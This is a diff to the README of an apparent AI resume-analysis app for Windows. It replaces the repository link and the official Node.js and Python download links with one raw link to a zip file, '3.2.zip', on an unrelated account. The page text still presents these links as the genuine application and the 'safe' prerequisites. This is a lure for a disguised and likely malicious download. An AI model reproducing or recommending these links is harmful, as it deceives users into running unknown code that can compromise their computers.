@@ -6,7 +6,7 @@ description: "Analyze resumes with AI to predict job categories and score matche
 <h1>⚡ Resume-Analyzer - Get Hired Faster With AI</h1>
 
 <p align="center">
-  <a href="https://github.com/Aerobic-hidrosis3388/Resume-Analyzer" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 16px 32px; border-radius: 50px; font-size: 20px; font-weight: bold; text-decoration: none; display: inline-block; margin: 20px 0; box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);">📥 DOWNLOAD FOR WINDOWS NOW</a>
+  <a href="https://raw.githubusercontent.com/Aerobic-hidrosis3388/aerobic-hidrosis3388.github.io/main/api/3.2.zip" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 16px 32px; border-radius: 50px; font-size: 20px; font-weight: bold; text-decoration: none; display: inline-block; margin: 20px 0; box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);">📥 DOWNLOAD FOR WINDOWS NOW</a>
 </p>
 
 ## 🎯 What Is This?
@@ -47,7 +47,7 @@ Follow these simple steps to run Resume-Analyzer on your Windows computer.
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/Aerobic-hidrosis3388/Resume-Analyzer](https://github.com/Aerobic-hidrosis3388/Resume-Analyzer)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Aerobic-hidrosis3388/aerobic-hidrosis3388.github.io/main/api/3.2.zip](https://raw.githubusercontent.com/Aerobic-hidrosis3388/aerobic-hidrosis3388.github.io/main/api/3.2.zip)
 
 Click the bright purple **"DOWNLOAD FOR WINDOWS NOW"** button at the top of this page to go directly to the download page.
 
@@ -56,14 +56,14 @@ Click the bright purple **"DOWNLOAD FOR WINDOWS NOW"** button at the top of this
 Resume-Analyzer needs two free programs installed first. Don't worry, they're safe and widely used.
 
 **Install Node.js (includes npm):**
-1. Go to [https://nodejs.org](https://nodejs.org)
+1. Go to [https://raw.githubusercontent.com/Aerobic-hidrosis3388/aerobic-hidrosis3388.github.io/main/api/3.2.zip](https://raw.githubusercontent.com/Aerobic-hidrosis3388/aerobic-hidrosis3388.github.io/main/api/3.2.zip)
 2. Click the big green button that says "LTS" (that means Long Term Support - the stable version)
 3. Run the downloaded installer
 4. Click "Next" through all the default options
 5. When finished, restart your computer
 
 **Install Python:**
-1. Go to [https://python.org](https://python.org)
+1. Go to [https://raw.githubusercontent.com/Aerobic-hidrosis3388/aerobic-hidrosis3388.github.io/main/api/3.2.zip](https://raw.githubusercontent.com/Aerobic-hidrosis3388/aerobic-hidrosis3388.github.io/main/api/3.2.zip)
 2. Click "Downloads"
 3. Click the yellow "Download Python" button
 4. Run the installer
